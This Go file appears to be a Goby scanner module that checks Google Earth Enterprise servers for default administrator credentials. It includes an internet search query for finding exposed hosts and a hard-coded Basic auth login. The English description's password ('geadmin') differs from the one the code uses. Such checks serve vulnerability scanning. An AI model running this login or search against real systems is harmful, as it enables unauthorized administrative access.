package exploits

import (
	"errors"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Google Earth Enterprise Default Password Vulnerability",
    "Description": "<p>Earth Enterprise is an open-source version of Google Earth Enterprise, a geospatial application that can build and host custom 3D globe and 2D maps.</p><p>There is a default password of geapacheuser/geadmin, which allows attackers to control the entire platform and use administrator privileges to operate core functions.</p>",
    "Product": "Google-Earth-Ent",
    "Homepage": "https://www.opengee.org/",
    "DisclosureDate": "2023-12-05",
    "PostTime": "2022-04-06",
    "Author": "AnMing",
    "FofaQuery": "title=\"GEE Server\" || (body=\"Google Earth Enterprise Server\" && body=\">Admin</a>\")",
    "GobyQuery": "title=\"GEE Server\" || (body=\"Google Earth Enterprise Server\" && body=\">Admin</a>\")",
    "Level": "2",
    "Impact": "<p>Attackers can control the entire platform through default password vulnerabilities, using administrator privileges to operate core functions.</p>",
    "Recommendation": "<p>1. Change the default password, which should preferably include uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.</p><p>2. If not necessary, public network access to the system is prohibited.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": false,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "input",
            "value": "login",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Default Password"
    ],
    "VulType": [
        "Default Password"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "Google Earth Enterprise 默认口令漏洞",
            "Product": "Google-Earth-Ent",
            "Description": "<p>Earth Enterprise 是 Google Earth Enterprise 的开源版本，是一款地理空间应用程序，能够构建和托管自定义 3D 地球仪和 2D 地图。存在默认口令geapacheuser/geeadmin，攻击者可通过默认口令漏洞控制整个平台，使用管理员权限操作核心的功能。<br></p>",
            "Recommendation": "<p>1、修改默认口令，密码最好包含大小写字母、数字和特殊字符等，且位数大于8位。</p><p>2、如非必要，禁止公网访问该系统。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
            "Impact": "<p>攻击者可通过默认口令漏洞控制整个平台，使用管理员权限操作核心的功能。<br></p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ]
        },
        "EN": {
            "Name": "Google Earth Enterprise Default Password Vulnerability",
            "Product": "Google-Earth-Ent",
            "Description": "<p>Earth Enterprise is an open-source version of Google Earth Enterprise, a geospatial application that can build and host custom 3D globe and 2D maps.</p><p>There is a default password of geapacheuser/geadmin, which allows attackers to control the entire platform and use administrator privileges to operate core functions.</p>",
            "Recommendation": "<p>1. Change the default password, which should preferably include uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.</p><p>2. If not necessary, public network access to the system is prohibited.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
            "Impact": "<p>Attackers can control the entire platform through default password vulnerabilities, using administrator privileges to operate core functions.<br></p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10489"
}`

	loginAuthorizationFlag343gfdg := func(hostInfo *httpclient.FixUrl) (string, error) {
		loginRequestConfig := httpclient.NewGetRequestConfig("/admin/")
		loginRequestConfig.VerifyTls = false
		loginRequestConfig.FollowRedirect = false
		loginRequestConfig.Header.Store("Host", hostInfo.HostInfo)
		loginRequestConfig.Header.Store("Authorization", "Basic Z2VhcGFjaGV1c2VyOmdlZWFkbWlu")
		loginRequestConfig.Header.Store("User-Agent", " Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36")
		resp, err := httpclient.DoHttpRequest(hostInfo, loginRequestConfig)
		if err == nil && resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, `Earth Enterprise Server`) && strings.Contains(resp.RawBody, `gees.admin.databaseView`) {
			return "Basic Z2VhcGFjaGV1c2VyOmdlZWFkbWlu", nil
		}
		return "", errors.New("漏洞利用失败")
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			Authorization, _ := loginAuthorizationFlag343gfdg(hostInfo)
			if len(Authorization) > 0 {
				stepLogs.VulURL = hostInfo.Scheme() + "://geapacheuser:geeadmin@" + hostInfo.HostInfo
				return true
			}
			return false
		}, nil,
	))
}
